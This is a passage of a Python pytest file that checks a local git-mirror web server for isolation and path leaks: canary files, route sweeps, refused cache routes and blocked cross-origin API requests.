                f' data-mirror-location="{self.location}" data-mirror-tip="{self.sentence(commit)}"'
            )
            assert text.count(heading) == 1, path
            return headers + text.replace(heading, ""), True
        return headers + text, False

    def assert_unnamed(self, path: str, response: Any, *, commit: str, where: object) -> bool:
        """Nothing of the cache or the origin stands outside the two allowed places.

        Not the application home or the origin's path, and not the parts a location is
        made of either: the store's key, or the name of the directory the stores are in.
        """

        rest, named = self.remainder(path, response, commit=commit)
        for private in (str(self.home), str(self.origin_path), self.store_key, "repository-stores"):
            assert private not in rest, (private, where, response.status_code)
        return named


def test_a_served_pin_reads_nothing_outside_its_own_store(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Populated-cache isolation over HTTP (mb-99ub).

    A second source is acquired into the same home and the working directory holds a
    file too. Every registered GET route is asked for both, by display name and by
    GitPath wire, and for the other source's commit; no answer carries either canary.
    The cache records that name the other source are refused outright, and a request
    from the sandboxed preview origin cannot read ``/api`` at all.

    No answer names the application home or the served origin either, nor the store's
    key or the directory the stores are in, with one exception that is held to its exact
    form: the status envelope and the page's heading say where the served mirror is kept
    and what it mirrors (``_ServedMirror.remainder``). That covers each answer's
    headers as well as its body, the error answers of the GET routes, and what the two
    POST routes that change the served pin answer, their refusals included. A file's
    content, a listing, an error, and every other envelope still name no path.
    """

    home = _home(tmp_path, monkeypatch)
    # The diagnostic routes answer only when enabled, so enable them for the sweep.
    monkeypatch.setenv("METABROWSER_DEBUG", "1")
    other = _second_source(tmp_path)
    asyncio.run(acquire_source(_file_source(other.path), home=home))
    cwd = tmp_path / "cwd"
    cwd.mkdir()
    (cwd / "canary.md").write_text(f"{_WORKING_DIRECTORY_CANARY}\n", encoding="utf-8")
    (cwd / "OTHER.md").write_text(f"{_WORKING_DIRECTORY_CANARY}\n", encoding="utf-8")
    monkeypatch.chdir(cwd)

    origin = _origin(tmp_path / "mine")
    result = _serve(origin.url)
    assert result.exit_code == 0, result.output

    probes = ("canary.md", "OTHER.md", _wire("canary.md"), _wire("OTHER.md"))
    routes = [
        route
        for route in server.app.routes
        if isinstance(route, Route)
        and "GET" in (route.methods or set())
        and route.path.startswith(("/api/", "/raw", "/view", "/commit", "/pull", "/_debug"))
    ]
    probed = [
        (route, url)
        for route in routes
        for url in _probe_urls(route, probes, other.first, origin.second)
    ]
    expected = {
        "/api/file",
        "/raw",
        "/raw/{path:path}",
        "/api/tree",
        "/api/git/commit/{revision}",
        "/api/plugin/diff/comparison",
        "/_debug/inventory",
        _STATUS_ROUTE,
        *_PAGE_ROUTES,
    }
    assert expected <= {route.path for route in routes}
    # The served store's bare repository, from the origin's address alone. The home is
    # not under the user's home directory here, so the location is absolute and the
    # sweep below would find the home in any answer that named it.
    store_key = origin_identity(origin.url).store_id.removeprefix("sha256:")
    location = str(home / "repository-stores" / store_key / "repository.git")
    assert Path(location, "HEAD").is_file()
    mirror = _ServedMirror(
        origin=origin.url,
        location=location,
        home=home,
        origin_path=origin.path,
        store_key=store_key,
    )
    with TestClient(server.app) as client:
        # The probe can see a leak: the pin's own content does come back.
        own = client.get("/api/file", params={"path": _wire("README.md")})
        assert "Second revision." in own.json()["content"]
        assert client.get(f"/api/git/commit/{other.first}").status_code == 404
        # The provider diagnostic has no provider to report on a pin.
        assert client.get("/_debug/inventory").json()["capability"] == "filesystem"
        named: set[str] = set()
        errored: set[str] = set()
        for route, url in probed:
            response = client.get(url)
            assert _OTHER_SOURCE_CANARY not in response.text, url
            assert _WORKING_DIRECTORY_CANARY not in response.text, url
            assert str(other.path) not in response.text, url
            if mirror.assert_unnamed(route.path, response, commit=origin.second, where=url):
                named.add(route.path)
            if response.status_code >= 400:
                errored.add(route.path)
        # The exception was met: the status and each page did name the location. And
        # the sweep read error answers too, the listing's own refusal among them.
        assert named == {_STATUS_ROUTE, *_PAGE_ROUTES}
        assert {"/api/source/refs", "/api/file", "/api/tree"} <= errored

        # The two routes that change what is served, with every kind of answer each
        # gives: a switch and its status, a selection the mirror lacks while the fetch
        # for it runs and after it ends, and each refusal.
        def post(path: str, body: object, *, commit: str) -> Any:
            response = client.post(path, json=body)
            if mirror.assert_unnamed(path, response, commit=commit, where=(path, body)):
                named.add(f"POST {path} {response.status_code}")
            return response

        def settled() -> None:
            deadline = time.monotonic() + 50
            while client.get(_STATUS_ROUTE).json()["refreshing"]:
                assert time.monotonic() < deadline, "the refresh did not finish"
                time.sleep(0.02)

        assert post(_REFRESH_ROUTE, {}, commit=origin.second).status_code in (200, 202)
        settled()
        assert post(_REFRESH_ROUTE, {"for": "branch"}, commit=origin.second).status_code == 400
        assert (
            post(_REFRESH_ROUTE, ["not", "an", "object"], commit=origin.second).status_code == 400
        )
        assert post(_PIN_ROUTE, {"ref": ":/first"}, commit=origin.second).status_code == 400
        assert post(_PIN_ROUTE, {}, commit=origin.second).status_code == 400
        assert post(_PIN_ROUTE, {"ref": "x" * 5000}, commit=origin.second).status_code == 413
        # A branch the mirror lacks: pending while the one fetch for it runs, then
        # refused in the route's own words, which is where an error message would leak.
        assert post(_PIN_ROUTE, {"ref": "gone"}, commit=origin.second).status_code == 202
        settled()
        missing = post(_PIN_ROUTE, {"ref": "gone"}, commit=origin.second)
        assert (missing.status_code, missing.json()["code"]) == (404, "selection_not_found")
        # Another cached source's commit is not in this store.
        assert post(_PIN_ROUTE, {"oid": other.first}, commit=origin.second).status_code in (
            202,
            404,
        )
        settled()
        switched = post(_PIN_ROUTE, {"oid": origin.first}, commit=origin.first)
        assert (switched.status_code, switched.json()["changed"]) == (200, True)
        # The page of the commit now served names it in the same two attributes.
        after = client.get("/view/")
        assert mirror.assert_unnamed(_PAGE_ROUTES[0], after, commit=origin.first, where="/view/")
        assert post(_PIN_ROUTE, {"oid": origin.second}, commit=origin.second).status_code == 200
        assert {
            f"POST {_REFRESH_ROUTE} 202",
            f"POST {_PIN_ROUTE} 202",
            f"POST {_PIN_ROUTE} 200",
        } <= named | {f"POST {_REFRESH_ROUTE} 200"}

        # The one POST that reads content: KPress rendering, by path and by source.
        for probe in probes:
            rendered = client.post("/api/kpress/render", json={"path": probe, "view": "document"})
            assert _OTHER_SOURCE_CANARY not in rendered.text, probe
            assert _WORKING_DIRECTORY_CANARY not in rendered.text, probe
            mirror.assert_unnamed("/api/kpress/render", rendered, commit=origin.second, where=probe)

        for route in ("/api/cache/layout", "/api/cache/sources", "/api/cache/stores"):
            refused = client.get(route)
            assert refused.status_code == 409, route
            assert refused.json()["capability"] == "cache_inspection"
        assert client.get("/api/cache/source/anything").status_code == 409

        # The preview frame's origin is opaque; nothing under /api answers it.
        for headers in ({"origin": "null"}, {"sec-fetch-site": "cross-site"}):
            for route in ("/api/source/status", f"/api/file?path={_wire('README.md')}"):
                assert client.get(route, headers=headers).status_code == 403, (route, headers)
